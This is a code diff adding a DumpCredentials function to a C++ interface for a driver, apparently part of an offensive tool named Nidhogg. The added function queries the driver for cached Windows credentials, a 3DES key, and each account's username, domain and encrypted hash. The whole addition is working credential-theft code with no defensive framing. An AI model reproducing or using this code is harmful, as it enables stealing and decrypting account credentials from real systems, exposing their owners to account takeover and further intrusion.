@@ -1,6 +1,126 @@
 #include "pch.h"
 #include "Nidhogg.h"
 
+std::vector<Credentials> NidhoggInterface::DumpCredentials(DesKeyInformation* desKey, NidhoggErrorCodes* status) {
+	*status = NIDHOGG_SUCCESS;
+	OutputCredentials currentOutputCreds{};
+	Credentials currentCreds{};
+	std::vector<Credentials> credentials;
+	DWORD returned = 0;
+	DWORD credSize = 0;
+	DWORD index = 0;
+
+	// Generating cached credentials.
+	if (!DeviceIoControl(this->hNidhogg, IOCTL_DUMP_CREDENTIALS,
+		nullptr, 0, &credSize, sizeof(credSize), &returned, nullptr)) {
+		*status = NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
+		return std::vector<Credentials>();
+	}
+
+	if (credSize == 0) {
+		*status = NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
+		return std::vector<Credentials>();
+	}
+
+	// Get 3DES key.
+	desKey->Size = 0;
+	desKey->Data = NULL;
+
+	if (!DeviceIoControl(this->hNidhogg, IOCTL_DUMP_CREDENTIALS,
+		nullptr, 0, desKey, sizeof(DesKeyInformation), &returned, nullptr)) {
+		*status = NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
+		return std::vector<Credentials>();
+	}
+
+	if (desKey->Size == 0) {
+		*status = NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
+		return std::vector<Credentials>();
+	}
+
+	desKey->Data = (PVOID)malloc(desKey->Size);
+
+	if (!desKey->Data) {
+		*status = NIDHOGG_GENERAL_ERROR;
+		return std::vector<Credentials>();
+	}
+
+	if (!DeviceIoControl(this->hNidhogg, IOCTL_DUMP_CREDENTIALS,
+		desKey, sizeof(DesKeyInformation), desKey, sizeof(DesKeyInformation), &returned, nullptr)) {
+		free(desKey->Data);
+		*status = NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
+		return std::vector<Credentials>();
+	}
+
+	// Get credentials.
+	for (index = 0; index < credSize; index++) {
+		currentOutputCreds.Index = index;
+		currentOutputCreds.Creds.Username.Buffer = NULL;
+		currentOutputCreds.Creds.Username.Length = 0;
+		currentOutputCreds.Creds.Domain.Buffer = NULL;
+		currentOutputCreds.Creds.Domain.Length = 0;
+		currentOutputCreds.Creds.EncryptedHash.Buffer = NULL;
+		currentOutputCreds.Creds.EncryptedHash.Length = 0;
+
+		if (!DeviceIoControl(this->hNidhogg, IOCTL_DUMP_CREDENTIALS,
+			&currentOutputCreds, sizeof(currentOutputCreds), &currentOutputCreds, sizeof(currentOutputCreds),
+			&returned, nullptr)) {
+			*status = NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
+			break;
+		}
+
+		currentOutputCreds.Creds.Username.Buffer = (WCHAR*)malloc(currentOutputCreds.Creds.Username.Length);
+
+		if (!currentOutputCreds.Creds.Username.Buffer) {
+			*status = NIDHOGG_GENERAL_ERROR;
+			break;
+		}
+
+		currentOutputCreds.Creds.Domain.Buffer = (WCHAR*)malloc(currentOutputCreds.Creds.Domain.Length);
+
+		if (!currentOutputCreds.Creds.Domain.Buffer) {
+			*status = NIDHOGG_GENERAL_ERROR;
+			free(currentOutputCreds.Creds.Username.Buffer);
+			break;
+		}
+
+		currentOutputCreds.Creds.EncryptedHash.Buffer = (WCHAR*)malloc(currentOutputCreds.Creds.EncryptedHash.Length);
+
+		if (!currentOutputCreds.Creds.EncryptedHash.Buffer) {
+			*status = NIDHOGG_GENERAL_ERROR;
+			free(currentOutputCreds.Creds.Username.Buffer);
+			free(currentOutputCreds.Creds.Domain.Buffer);
+			break;
+		}
+
+		if (!DeviceIoControl(this->hNidhogg, IOCTL_DUMP_CREDENTIALS,
+			&currentOutputCreds, sizeof(currentOutputCreds), &currentOutputCreds, sizeof(currentOutputCreds),
+			&returned, nullptr)) {
+			
+			*status = NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
+			free(currentOutputCreds.Creds.Username.Buffer);
+			free(currentOutputCreds.Creds.Domain.Buffer);
+			free(currentOutputCreds.Creds.EncryptedHash.Buffer);
+			break;
+		}
+
+		currentCreds.Username = currentOutputCreds.Creds.Username;
+		currentCreds.Domain = currentOutputCreds.Creds.Domain;
+		currentCreds.EncryptedHash = currentOutputCreds.Creds.EncryptedHash;
+		credentials.push_back(currentCreds);
+	}
+
+	if (*status != NIDHOGG_SUCCESS) {
+		for (DWORD i = 0; i < credentials.size(); i++) {
+			free(credentials[i].Username.Buffer);
+			free(credentials[i].Domain.Buffer);
+			free(credentials[i].EncryptedHash.Buffer);
+		}
+		free(desKey->Data);
+	}
+
+	return credentials;
+}
+
 std::wstring NidhoggInterface::ParsePath(wchar_t* path) {
 	std::wstring result = path;
 
